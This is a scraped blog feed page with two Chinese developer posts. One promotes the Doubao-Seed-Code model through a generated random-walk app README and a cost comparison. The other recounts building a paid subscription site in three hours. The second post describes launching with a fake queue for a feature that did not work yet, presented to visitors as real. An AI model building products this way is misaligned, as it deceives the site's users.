<span class="hljs-section">### 📍 智能兴趣点推荐</span>
<span class="hljs-bullet">-</span> 沿途兴趣点自动发现和推荐
<span class="hljs-bullet">-</span> 支持多种POI类型（咖啡厅、书店、公园、艺术馆等）
<span class="hljs-bullet">-</span> 丰富用户探索体验和文化发现

<span class="hljs-section">### 🧭 沉浸式导航体验</span>
<span class="hljs-bullet">-</span> 实时地图显示和路线追踪
<span class="hljs-bullet">-</span> 步骤式导航指引和进度显示
<span class="hljs-bullet">-</span> 暂停/继续功能，灵活控制探索节奏

<span class="hljs-section">### 📸 路线作品生成与分享</span>
<span class="hljs-bullet">-</span> 一键保存完整路线信息和探索轨迹
<span class="hljs-bullet">-</span> 自定义路线标题和描述
<span class="hljs-bullet">-</span> 生成分享链接和二维码，分享您的探索故事

<span class="hljs-section">## 技术架构</span>

<span class="hljs-section">### 前端</span>
<span class="hljs-bullet">-</span> <span class="hljs-strong">**框架**</span> : React 18 + Vite
<span class="hljs-bullet">-</span> <span class="hljs-strong">**地图集成**</span> : 高德地图JavaScript API
<span class="hljs-bullet">-</span> <span class="hljs-strong">**状态管理**</span> : React Hooks
<span class="hljs-bullet">-</span> <span class="hljs-strong">**样式方案**</span> : styled-components
<span class="hljs-bullet">-</span> <span class="hljs-strong">**UI组件**</span> : 自定义React组件

<span class="hljs-section">### 后端</span>
<span class="hljs-bullet">-</span> <span class="hljs-strong">**框架**</span> : FastAPI
<span class="hljs-bullet">-</span> <span class="hljs-strong">**地图服务**</span> : 高德地图REST API
<span class="hljs-bullet">-</span> <span class="hljs-strong">**业务逻辑**</span> : 路线生成算法、红绿灯决策系统、POI搜索服务
<span class="hljs-bullet">-</span> <span class="hljs-strong">**部署**</span> : Uvicorn ASGI服务器

<span class="hljs-section">## 快速开始</span>

<span class="hljs-section">### 前置条件</span>
<span class="hljs-bullet">-</span> Python 3.8+
<span class="hljs-bullet">-</span> Node.js 16+
<span class="hljs-bullet">-</span> npm 8+

<span class="hljs-section">### 安装与运行</span>

<span class="hljs-section">#### 1. 克隆项目</span>
<span class="hljs-code">```bash
git clone [仓库地址]
cd 电子城市盲盒
```</span>

<span class="hljs-section">#### 2. 配置环境变量</span>

<span class="hljs-section">##### 后端配置</span>
在 <span class="hljs-code">`backend/.env`</span> 文件中添加以下内容（可选）：
<span class="hljs-code">```
AMAP_KEY=your_amap_api_key
```</span>

<span class="hljs-quote">&gt; 注意：项目已配置模拟模式，无需API Key也可运行基本功能</span>

<span class="hljs-section">##### 前端配置</span>
在 <span class="hljs-code">`frontend/public/index.html`</span> 中配置高德地图API：
<span class="hljs-code">```html
&lt;script type="text/javascript" src="https://webapi.amap.com/maps?v=2.0&amp;key=your_amap_key"&gt;&lt;/script&gt;
```</span>

<span class="hljs-section">#### 3. 启动后端服务</span>
<span class="hljs-code">```bash
cd backend
pip install -r requirements.txt
python main.py
```</span>
后端服务将运行在 http://localhost:8000

<span class="hljs-section">#### 4. 启动前端服务</span>
<span class="hljs-code">```bash
cd ../frontend
npm install
npm run dev
```</span>
前端服务将运行在 http://localhost:3000

<span class="hljs-section">## 使用指南</span>

<span class="hljs-bullet">1.</span> <span class="hljs-strong">**选择起点**</span> : 在地图上点击选择您的出发位置
<span class="hljs-bullet">2.</span> <span class="hljs-strong">**生成路线**</span> : 点击"生成路线"按钮，系统将创建一条随机探索路线
<span class="hljs-bullet">3.</span> <span class="hljs-strong">**开始漫步**</span> : 查看路线详情，点击"开始漫步"进入导航模式
<span class="hljs-bullet">4.</span> <span class="hljs-strong">**决策互动**</span> : 遇到路口时，掷骰子决定行进方向
<span class="hljs-bullet">5.</span> <span class="hljs-strong">**探索兴趣点**</span> : 沿途发现感兴趣的地点，可暂停导航进行探索
<span class="hljs-bullet">6.</span> <span class="hljs-strong">**完成旅程**</span> : 到达终点后，查看完整的探索记录
<span class="hljs-bullet">7.</span> <span class="hljs-strong">**保存路线作品**</span> : 填写路线标题和描述，保存您的探索轨迹
<span class="hljs-bullet">8.</span> <span class="hljs-strong">**分享探索故事**</span> : 获取分享链接或扫描二维码，与朋友分享您的城市漫步体验

<span class="hljs-section">## 项目结构</span>

<span class="hljs-code">```
电子城市盲盒/
├── backend/                  # 后端服务
│   ├── app/
│   │   ├── api/              # API路由
│   │   ├── services/         # 业务逻辑服务
│   │   └── config/           # 配置文件
│   ├── main.py              # 应用入口
│   └── requirements.txt     # 依赖列表
├── frontend/                 # 前端应用
│   ├── src/
│   │   ├── components/      # React组件
│   │   ├── services/        # API服务
│   │   ├── App.jsx          # 主应用组件
│   │   └── main.jsx         # 应用入口
│   ├── public/              # 静态资源
│   └── package.json         # 依赖配置
└── README.md                # 项目说明文档
```</span>

<span class="hljs-section">## 特色功能</span>

<span class="hljs-bullet">-</span> <span class="hljs-strong">**模拟模式**</span> : 无需真实API Key也能体验完整功能
<span class="hljs-bullet">-</span> <span class="hljs-strong">**随机算法**</span> : 基于真实道路的智能随机路线生成
<span class="hljs-bullet">-</span> <span class="hljs-strong">**游戏化设计**</span> : 骰子决策机制增强探索趣味性
<span class="hljs-bullet">-</span> <span class="hljs-strong">**响应式UI**</span> : 适配不同屏幕尺寸的设备
<span class="hljs-bullet">-</span> <span class="hljs-strong">**实时交互**</span> : 流畅的地图操作和导航体验

<span class="hljs-section">## 开发说明</span>

<span class="hljs-section">### 后端开发</span>
<span class="hljs-bullet">-</span> API文档: http://localhost:8000/docs
<span class="hljs-bullet">-</span> 主要模块:
<span class="hljs-bullet">  -</span> <span class="hljs-code">`RouteGenerator`</span>: 路线生成服务
<span class="hljs-bullet">  -</span> <span class="hljs-code">`TrafficLightManager`</span>: 红绿灯决策服务
<span class="hljs-bullet">  -</span> <span class="hljs-code">`POISearcher`</span>: 兴趣点搜索服务

<span class="hljs-section">### 前端开发</span>
<span class="hljs-bullet">-</span> 组件结构:
<span class="hljs-bullet">  -</span> <span class="hljs-code">`MapComponent`</span>: 地图显示和交互
<span class="hljs-bullet">  -</span> <span class="hljs-code">`ControlPanel`</span>: 控制面板和交互
<span class="hljs-bullet">  -</span> <span class="hljs-code">`DiceComponent`</span>: 骰子组件
<span class="hljs-bullet">  -</span> <span class="hljs-code">`NavigationComponent`</span>: 导航指引
<span class="hljs-bullet">  -</span> <span class="hljs-code">`POICard`</span>: 兴趣点卡片
<span class="hljs-bullet">  -</span> <span class="hljs-code">`RouteWorkComponent`</span>: 路线作品生成和分享

<span class="hljs-section">## 许可证</span>

MIT License

<span class="hljs-section">## 致谢</span>

<span class="hljs-bullet">-</span> 高德地图API提供地图数据支持
<span class="hljs-bullet">-</span> React、FastAPI等开源技术栈
<span class="hljs-bullet">-</span> 所有为项目贡献代码的开发者

---

<span class="hljs-emphasis">*让城市探索充满惊喜，开启您的随机漫步之旅！*</span> 🌆🎲✨
</code></pre>
<p>项目架构如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63e79a7970ad42d2ae6dcdcfd697ae7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=QosV1O7xwo1%2FAAHSHwDVYExFDZ0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8">四.对比：为什么它赢了？</h2>
<p>除了Doubao-Seed-Code，我用2个国外的模型进行了对比，做了相同任务：。</p>
<p>Doubao-Seed-Code生成的效果：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a00bbb8685df4390aa3ac580d2b489d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=e8%2F1EW%2F1c82qM0%2FRUa%2Fj3FqsM24%3D" alt="" loading="lazy"/></p>
<p><strong>模型一：</strong></p>
<p>仅简单的界面，其余功能都未实现。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/799913ba4bbb4806b44aa907344c7f4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=Oh%2FH248WRqJ3SZyp4JJQDfadeZ8%3D" alt="" loading="lazy"/></p>
<p><strong>模型二：</strong></p>
<p>无法理解图片，仅生成了记得的前端，用的AI常用的紫色配色。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a179b63594294e14921c1ed5a5d8e099~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=QyZ%2FBj01jYQlCl7LLU%2Bp28t5ovI%3D" alt="" loading="lazy"/></p>
<p>对比表如下：</p>

































<table><thead><tr><th>模型</th><th>是否理解图片</th><th>是否生成完整项目</th><th>是否还原布局</th><th>成本（估算）</th></tr></thead><tbody><tr><td>Doubao-Seed-Code</td><td>✅ 原生VLM，精准还原</td><td>✅ 前后端齐全，功能完整</td><td>✅ 100%还原草图</td><td>¥0.34（0-32K区间）</td></tr><tr><td>模型一</td><td>❌ 仅靠文字描述</td><td>⚠️ 只生成前端UI，无后端逻辑</td><td>❌ 配色乱、布局错</td><td>¥4.05</td></tr><tr><td>模型二</td><td>❌ 无视图片</td><td>❌ 生成“标准模板”，紫色主题，无交互</td><td>❌ 完全跑偏</td><td>¥2.10</td></tr></tbody></table>
<blockquote>
<p>📌 <strong>Doubao-Seed-Code的输入价格：1.20元/百万Token，输出8.00元/百万Token</strong></p>
<p>在相同任务下，成本<strong>不到Claude的1/10</strong>，且效果碾压。</p>
</blockquote>
<h2 data-id="heading-9"><strong>五.Doubao-Seed-Code 超高性价比</strong></h2>
<p>火山方舟推出了 <strong>Coding Plan 订阅制</strong>：</p>























<table><thead><tr><th>套餐</th><th>首月价格</th><th>续费价格</th><th>适合人群</th></tr></thead><tbody><tr><td><strong>Lite</strong></td><td>¥9.9</td><td>¥40/月</td><td>个人开发者、学生、轻量项目</td></tr><tr><td><strong>Pro</strong></td><td>¥49.9</td><td>¥200/月</td><td>团队、复杂项目、高频调用</td></tr></tbody></table>
<blockquote>
<p>✅ <strong>支持Claude Code、Cursor、Cline、Codex</strong> <strong>CLI</strong>等主流工具</p>
<p>✅ 全量透明缓存，实际成本再降80%</p>
<p>✅ <strong>火山方舟平台提供</strong> <strong>API</strong> <strong>调用中心</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fconsole.volcengine.com%2Fark%2Fregion%3Aark%2Bcn-beijing%2Fmodel%2Fdetail%3FId%3Ddoubao-seed-code" target="_blank" title="https://console.volcengine.com/ark/region:ark+cn-beijing/model/detail?Id=doubao-seed-code" ref="nofollow noopener noreferrer">console.volcengine.com/ark/region:…</a></p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2fd7b6aa41764cc09242bc277fdd42d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=fKTGkk25vA2S48wmR50A%2FhI9Eow%3D" alt="" loading="lazy"/></p>
<p><strong>我用Lite套餐，首月9.9元，完成了这个项目，还顺手写了3个小程序。</strong></p>
<blockquote>
<p>举例来说，创建一个美观的交互式 Python 学习网站，相同tokens量下（0-32k区间），Claude Sonnet 4.5成本约4.05元，GLM-4.6约0.77元，而Doubao-Seed-Code仅约0.34元。</p>
</blockquote>
<hr/>
<p>另外，在<strong>Terminal</strong> <strong>Bench、SWE-Bench-Verified-Openhands、Multi-SWE-Bench-Flash-Openhands</strong>等主流测评集中表现出色，仅次于Sonnet4.5，碾压国内模型</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94dd5774e53740a788fc9caa45fe4d59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=pUQuep8KNZndAp%2BLmiBTwZM5V4E%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-10">六.总结：它不是工具，是“懂你”的伙伴</h2>
<p>Doubao-Seed-Code 的革命性，不在于它“能写代码”，而在于它终于<strong>看懂了人类的意图</strong>。</p>
<p>过去，我们写需求文档，像给外星人写说明书：</p>
<blockquote>
<p>“请在页面左上角放一个地图，右下角放一个按钮，点击后触发随机算法，返回3个兴趣点，用蓝色字体，字体大小16px，悬停有阴影……”</p>
</blockquote>
<p>而今天，我们只需画一张草图，说一句：“帮我做出来。”</p>
<p>它知道：</p>
<ul>
<li>哪里是按钮，哪里是地图；</li>
<li>哪里该有动画，哪里该有真实评价；</li>
<li>哪个“咖啡杯”不是装饰，而是故事的起点。</li>
</ul>
<p>它不靠你“说清楚”，它靠你“画出来”。</p>
<p>这不是AI编程的进化，这是<strong>人机协作</strong> <strong>范式</strong> <strong>的跃迁</strong>。</p>
<blockquote>
<p>“以前是人教AI怎么干活，现在是AI看懂人想干嘛。” —— 这才是真正的“原生智能”。</p>
</blockquote>
<h4 data-id="heading-11">为什么这很重要？</h4>
<ol>
<li><strong>降低技术门槛</strong>：设计师、产品经理、普通用户，都能直接“画出产品”。</li>
<li><strong>提升创作效率</strong>：从“写5000字需求”到“画5分钟草图”，效率提升10倍。</li>
<li><strong>释放创造力</strong>：不再被语法、框架、API文档束缚，专注“我想做什么”。</li>
<li><strong>重塑开发流程</strong>：未来，产品经理画原型 → AI生成代码 → 测试上线，三步完成。</li>
</ol>
<p>这不是未来，这是<strong>现在正在发生的现实</strong>。</p>
<p>我用9.9元，让AI替我走了一条从未走过的城市小巷。 我没有出门，但我“走”过了整座城。</p>
<p><strong>当AI能读懂你的草图，它就不再是工具，而是你思维的延伸。</strong></p>
<blockquote>
<p>🌆 <strong>真正的City Walk，不是用脚走，而是用心看。</strong> 而现在，AI，替你看了。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[三小时上线，七天破千刀：AI 出海订阅站的 0-1 全流程复盘]]></title>    <link>https://juejin.cn/post/7576141849430327323</link>    <guid>https://juejin.cn/post/7576141849430327323</guid>    <pubDate>2025-11-24T15:53:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576141849430327323" data-draft-id="7576155790164623411" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="三小时上线，七天破千刀：AI 出海订阅站的 0-1 全流程复盘"/> <meta itemprop="keywords" content="产品,AI编程"/> <meta itemprop="datePublished" content="2025-11-24T15:53:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="孟健AI编程"/> <meta itemprop="url" content="https://juejin.cn/user/4212984287073895"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            三小时上线，七天破千刀：AI 出海订阅站的 0-1 全流程复盘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984287073895/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    孟健AI编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T15:53:45.000Z" title="Mon Nov 24 2025 15:53:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读23分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是孟健。</p>
<p>上周末，创业的第二个月，我收到了第一笔客户订单。</p>
<p>到现在，短短一周内已经破千刀，并且收入还在刷新新高。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e3ad32222d947f89eb3ed97c2d0ae2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604424&amp;x-signature=bdZCsPvHIbUZPwy7HiSjCCCXAn0%3D" alt="" loading="lazy"/></p>
<p>我给自己的 0-1 目标是：3 个月内赚到 1,000 美元，走出“新手村”。</p>
<p>现在提前达成，内心非常激动。</p>
<p>当然，最激动的应该还是第一个有收入的晚上，享受到了躺赚的快乐，也很符合“边际递减”的原理。</p>
<p>这篇总结原本几天前就想写，无奈竞争太激烈，我连续工作了十天应对各种变化和危机。</p>
<p>今天终于在休息的空档把整个过程和方法论写出来，希望对大家有启发。</p>
<blockquote>
<p>由于竞争关系，产品本身暂不公开，但思路和实操细节全分享给大家。</p>
</blockquote>
<h2 data-id="heading-0">01/ 3 小时上站的实战</h2>
<h3 data-id="heading-1">当天发现需求，当天上线</h3>
<p>我们团队有一条铁律：<strong>当天发现的新需求，必须当天上线</strong>。</p>
<p>对于创业来说，市场不会等人，速度就是优势。</p>
<p>这个订阅站是我做的第二个订阅型站点。</p>
<p>此前线下借助 AI 编程的杠杆，我们在一个月里做了近 30 个小产品，已经练就了「3 小时上站」的节奏，而且质量不算差。</p>
<h3 data-id="heading-2">竞品拆解：需求强、对手弱点清晰</h3>
<p>发现需求时已经是晚上 7 点。</p>
<p>我快速做了市场调研，去 Reddit、Twitter、YouTube 追溯来龙去脉。</p>
<p>结论：需求足够强烈，竞品登上了 Google SERP 第一，但存在明显短板：</p>
<ul>
<li>
<p>功能是假的，基本不可用</p>
</li>
<li>
<p>SEO 一般</p>
</li>
<li>
<p>优势在于 Twitter 运营和极简交互</p>
</li>
</ul>
<p>能上第一，说明需求强、市场尚无更好产品，这是机会窗口。</p>
<h3 data-id="heading-3">MVP 策略：真存储 + 假队列 + Waitlist</h3>
<p>不过当时只有 3 个小时，所以我也决定先不对接实际的 API，一个是我对这类需求的 API 也不是特别熟悉，对接起来时间不够，第二是遵循 MVP 思想，先验证市场需求，再完善产品。</p>
<p>于是，我快速做了一个设计和体验更丰富的站点，而且对接了真实的后台存储（因为我很熟，所以确信加了真实存储也能在 3 小时内搞定），然后同样做了一个假的等待排队，但多了一个 waitlist。</p>
<p>这是我认为和竞品拉开差距的地方，对面做的是个假的，没有后台去看用户的意愿。</p>
<p>我虽然也是个假功能，但是加了真实的 waitlist，这样我就能在后台看到有多少个用户对这个产品有意愿，这也是很多业界产品的通用做法。</p>
<h2 data-id="heading-4">02/ 上线 48 小时的惊喜与危机</h2>
<p>当天上完站我就回去了，直到第二天开会，数据复盘的时候，感觉到和之前的网站不一样的地方。</p>
<p>GSC 还没出数据，GA 实时在线已有上百人，Clarity 显示上千访客。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b19f97751244abbb3b6bf8a28021425~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604424&amp;x-signature=64wlLKnUBqQizQN80lIHoLlUqZE%3D" alt="" loading="lazy"/></p>
<p>一搜发现站点直接冲上 Google 第一。Waitlist 也超百，需求被验证，我立刻决定对接真实能力。</p>
<p>于是我优先上了一版对接真实 API 的版本，以及真实的队列。但上去后我发现有几个非常严重的问题。</p>
<h3 data-id="heading-5">API 成本失控</h3>
<p>一个是 API 的成本不小，排队状态下，每小时能烧掉 1–2 美元。一天几十刀，没开始赚钱就要亏钱。</p>
<p>我设计了一套复杂的队列机制，也就是一个成本锁，我让它在排队的机制上加上延时节流，保证 3 天 10 美元的节奏运行，这套设计非常复杂，测试起来也不容易，导致大量时间浪费在这了。</p>
<h3 data-id="heading-6">队列把数据库打挂</h3>
<p>第二个是我直接用 DB 去实现队列，导致读写请求过于频繁，直接把连接池耗光了，数据库出现了不可用的情况。</p>
<p>这个时候技术还算有点作用了，当时我去搞了一个 redis，把队列逻辑迁移到 redis 上，加了缓存，不至于把数据库打挂。</p>
<h3 data-id="heading-7">支付审核的不确定性</h3>
<p>当时一般支付都要审核个好几天，而且海外支付收得特别紧，你基本上被拒 1 次，就要等 3 个月了，这是不能接受的。</p>
<p>所以当天我搞到了凌晨 3 点，和 AI 一起挨个确认支付合规的细节。</p>
<p>我记得已经很久没有到凌晨 3 点了，毕竟年龄大了，熬不住了。</p>
<p>而且我出来创业有一条原则，就是不以牺牲健康为代价。</p>
<p>但那天晚上我打破了这个原则，到了关键时刻，也是必须做出的取舍。</p>
<p>第二天中午醒来，发现了一个好消息，支付审核一次通过，这次通过的很快，可能归功于我和 AI 反复斟酌和确认每个细节。</p>
<p>于是我拖着疲惫的身躯，赶紧在当前就把支付对接了，现在 Codex 的能力真的挺强，登录支付基本上就是一次成功了。不过测试还是有点麻烦，需要手动搞两套环境去验证。</p>
<p>接完支付之后，我在生产环境自己下了个单，作为这个产品的首个客户，Creem 还给我发了个邮件庆祝。</p>
<p>当时我就在想，如果是真实用户该有多好。</p>
<p>然后我扫了一眼 GSC，24 小时已经出词了，而且四个指标都非常的夸张，远超我此前的任何数据，再看一眼 GA，DAU 直接好几千，我之前每日的 uv 基本上最高只有 100：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc4e34104d454650ace7d0b313c9e7b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604424&amp;x-signature=WaE5A5GJYPi48ENqYMiMy3Qsnf8%3D" alt="" loading="lazy"/></p>
<p>对接完支付，第二天起来发现，竟然实际用户出单了，而且出了十多单，于是就有了这条朋友圈：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35f5910c36ad4a99ae2d92b308ccb25b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604424&amp;x-signature=gWlmv9wVALPaOTUdzar%2FODFsm8w%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8">03/ 防守与反击</h2>
<p>然后也在这天我发现了很多竞品，都排上来了，感到很大的压力，于是就展开了多项工作，去做防守和反击。这里提两个比较大的事项：Affliate 和 EDM。</p>
<h3 data-id="heading-9">Affiliate（联盟）</h3>
<p>说实话，在此之前我没有接触过海外的 Affliate，像这种联盟营销的路子，其实也是 SEO 赚钱的一种玩法，基本上通过联盟平台 CPA 或者 CPS 去赚取收益。</p>
<p>在我排名往下掉的那几天，我的 email 上收到了很多合作意向，其中一个是 Affliate 的，这个团队很有意思，他们通过 SEO 手段拿到了第一的排名，然后想让我这个产品提供 Affliate 的方式给他：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0fca3ab1902948f697bc4bb333f10c2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604424&amp;x-signature=7tNzU9uQwiCIx9UPiiCpryTLDTU%3D" alt="" loading="lazy"/></p>
<p>当时我确实比较焦虑排名往下掉的问题，但是我又不可能大动干戈地去注册 Affliate 平台，那套机制本身太复杂而且还得给平台付很多钱，所以我跟他约定了一个简单的方式，我这边实现统计看板，按月给他结算。</p>
